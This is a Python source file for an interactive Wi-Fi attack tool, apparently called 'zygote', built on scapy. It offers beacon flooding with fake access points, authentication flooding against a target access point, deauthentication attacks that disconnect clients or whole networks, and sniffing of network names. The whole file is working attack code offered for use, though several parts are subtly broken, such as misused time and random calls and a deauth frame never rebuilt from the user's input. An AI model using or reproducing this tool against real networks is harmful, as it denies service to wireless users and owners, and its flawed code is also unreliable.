from scapy.all import *
from time import sleep as rest
from time import time
import threading
import frame
from random import _urandom as byte_object
from subprocess import call as syscall
import multiprocessing

deauthencations = 0
network_essids = []
client = "FF:FF:FF:FF:FF:FF"
IEEE802AP = "FF:FF:FF:FF:FF:FF"
interface = "none"
deauthencation_frame = RadioTap()/Dot11(addr1=client, addr2=IEEE802AP, addr3=IEEE802AP)/Dot11Deauth()

syscall("clear", shell=True)
print (frame.banner)
def startframe():
	while True:
		try:
			global deauthencations
			global network_essids
			global deauthencation_frame
			global client
			global IEEE802AP
			global mac_addr
			prompt = input("\033[94mzygote>\033[95m ").lower()
			mvi = prompt.split(" ")[0]
			if mvi == "help":
				print (frame.options)
				startframe()
			if mvi == "clear":
				syscall("clear")
				startframe()
			if mvi == "banner":
				syscall("clear")
				print (frame.banner)
			if mvi == "exit":
				exit()
			if mvi == "beaconflood":
				annoyance_time = float(prompt.split(" ")[1])
				time_setter = time.time() + annoyance_time
				print ("[+] Sending beacon frames...")
				def task():
					try:
						while time.time() < time_setter:
							randstr1 = random.randint(0, 255)
							randstr2 = random.randint(0, 255)
							randstr3 = random.randint(0, 255)
							randstr4 = random.randint(0, 255)
							randstr5 = random.randint(0, 255)
							randstr6 = random.randint(0, 255)
							def starting_task():
								while True:
									rand_name = random._urandom(10)
									mac = str("%02x:%02x:%02x:%02x:%02x:%02x\n" % (randstr1, randstr2, randstr3, randstr4, randstr5, randstr6))
									dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)
									beacon = Dot11Beacon(cap='ESS+privacy')
									essid = Dot11Elt(ID='SSID',info=str(rand_name))
									frame = (RadioTap() / dot11 / beacon / essid)
									sendp(frame, verbose=False)
							multiprocessing.Process(target=starting_task).start()
							threading.Thread(target=starting_task).start()
					except KeyboardInterrupt:
						startframe()
			if mvi == "authentication":
				try:
					IEEE802AP = prompt.split(" ")[1]
					interface = prompt.split(" ")[2]
					print ("Sending authentication clients...")
					while True:
						randstr1 = random.randint(0, 255)
						randstr2 = random.randint(0, 255)
						randstr3 = random.randint(0, 255)
						randstr4 = random.randint(0, 255)
						randstr5 = random.randint(0, 255)
						randstr6 = random.randint(0, 255)
						mac_addr = str("%02x:%02x:%02x:%02x:%02x:%02x\n" % (randstr1, randstr2, randstr3, randstr4, randstr5, randstr6))
						authentication_frame = RadioTap()/Dot11(addr1=IEEE802AP, addr2=mac_addr, addr3=IEEE802AP)/Dot11Auth()
						sendp(authentication_frame, iface=interface, verbose=False)
				except KeyboardInterrupt:
					print ("\nStopped")
					startframe()
			if mvi == "deauth":
				try:
					IEEE802AP = prompt.split(" ")[1]
					interface = prompt.split(" ")[2]
					client = prompt.split(" ")[3]
					try:
						print ("Deauthencation frames sending....")
						def framesend(interface, IEEE802AP, client, authentication_frame):
							while True:
								if client == "0":
									client = "FF:FF:FF:FF:FF:FF"
									sendp(deauthencation_frame, iface=interface, verbose=False)
								else:
									sendp(deauthencation_frame, iface=interface, verbose=False)
						while True:
							t = threading.Thread(target=framesend, args=(interface, IEEE802AP, client, deauthencation_frame))
							t.setDaemon(True)
							t.start()
					except KeyboardInterrupt:
						t.setDaemon(False)
						print ("\nStopped")
						startframe()
				except KeyboardInterrupt:
					print ("\nStopped!")
					startframe()
			if mvi == "networklist":
				interface = prompt.split(" ")[1]
				capture_count = 0
				ssids = set()
				def pkt_handler(pkt):
					if pkt.haslayer(Dot11Beacon):
						temp = pkt
						while temp:
							temp = temp.getlayer(Dot11Elt)
							if temp and temp.ID == 0 and (temp.info not in ssids):
								ssids.add(temp.info)
								print (len(ssids), pkt.addr3, temp.info)
								break
							temp = temp.payload
				sniff(iface=interface, prn=pkt_handler)
		except KeyboardInterrupt:
			print ("Stopped\n")
			startframe()
startframe()